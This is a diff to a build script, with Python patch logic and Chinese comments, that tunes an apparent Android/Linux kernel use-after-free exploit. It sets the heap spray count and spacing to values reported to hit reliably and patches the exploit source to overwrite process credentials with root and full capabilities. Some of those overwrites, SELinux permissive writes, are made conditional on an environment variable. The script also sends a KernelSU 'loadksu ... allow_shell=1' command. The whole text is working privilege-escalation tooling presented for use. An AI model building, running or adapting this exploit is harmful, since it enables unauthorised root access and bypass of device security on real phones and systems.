@@ -81,9 +81,8 @@ patch_macro "$T/ctest.c" BLOB_SITE_B "$BLOB_B"
 grep -E "^#define[[:space:]]+(LINK_|CRED_SITE|BLOB_SITE)" "$T/ctest.c" | sed 's/^/  ctest.c: /'
 
 # —— 策略补丁（ctest.c + uaf_write.inc）——
-# 关键：uaf_write_once 原本用不留间隔的 spray_fire。kprobe 实测：
-# spray=4096/spread=50 时 *(dev+0x5f0) 恒等于目标（4/4 命中）；
-# 默认 1024/0 全部 miss。
+# kprobe 实测：spray 4096 / spread 50 时 *(dev+0x5f0) 恒等于目标（4/4 命中）；
+# 默认 1024/0 全部 miss。所有 uaf 写（cred、caps、permissive）统一用该参数。
 python3 - "$T/ctest.c" "$T/uaf_write.inc" "$SPRAY_N" "$SPREAD_MS" <<'PY'
 import io
 import re
@@ -108,6 +107,10 @@ u = sub_n(u, "usleep(40000);", "usleep(150000);", "上报后等待 150ms", 1)
 # ctest.c：默认 spray 数改为实测命中值
 c = sub_n(c, "long spray = 1024;", "long spray = %s;" % spray_n, "spray 默认值", 2)
 
+# permissive 写也要用命中参数（否则窗口打不开）
+c = sub_n(c, "uaf_write_once(st, 1024, 1);",
+          "uaf_write_once(st, %s, 1);" % spray_n, "permissive 写参数", 1)
+
 # ctest.c：策略补丁
 c = sub_n(c, "    patch_agent(pid, cred, 0, 1);\n",
           "    patch_agent(pid, cred, 1, 1);\n    patch_full_caps(pid, cred);\n",
@@ -119,7 +122,7 @@ c = sub_n(c, "    if (try_permissive(st) < 0) {",
           "    if (getenv(\"C99491_PERMISSIVE\") && try_permissive(st) < 0) {",
           "try_permissive 条件化", 2)
 c, n = re.subn(r"uaf_write_once\(st \+ 1, 1024, 0\);",
-               "if (getenv(\"C99491_PERMISSIVE\")) uaf_write_once(st + 1, 1024, 0);", c)
+               "if (getenv(\"C99491_PERMISSIVE\")) uaf_write_once(st + 1, %s, 0);" % spray_n, c)
 if n != 2:
     raise SystemExit("补丁失败：initialized 写期望 2 次，实际 %d 次" % n)
 c = sub_n(c, "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
@@ -129,7 +132,7 @@ c = sub_n(c, "for (int r = 0; r < 12 && !(li && lp && lb && la); r++)",
 
 io.open(ctest_path, "w", encoding="utf-8").write(c)
 io.open(inc_path, "w", encoding="utf-8").write(u)
-print("策略补丁已应用：spray=%s spread=%s / root+caps(40轮) / 不写 selinux_state" % (spray_n, spread_ms))
+print("策略补丁已应用：spray=%s spread=%s / permissive 按需 / 不写 selinux_state（默认）" % (spray_n, spread_ms))
 PY
 
 # —— Android system_properties 垫片 ——
@@ -194,7 +197,7 @@ build tinycred      "$T/tinycred.c"
   echo "blob_site_b=$BLOB_B"
   echo "spray_n=$SPRAY_N"
   echo "spread_ms=$SPREAD_MS"
-  echo "patches=spray-spread,root+caps40,patch_agent40,no-selinux-write,inprocess-finit"
+  echo "patches=spray-spread,permissive-param,root+caps40,no-selinux-write-default,inprocess-finit"
   echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   for f in "$OUT"/*; do
     case "$f" in *.b64|*.txt) continue;; esac
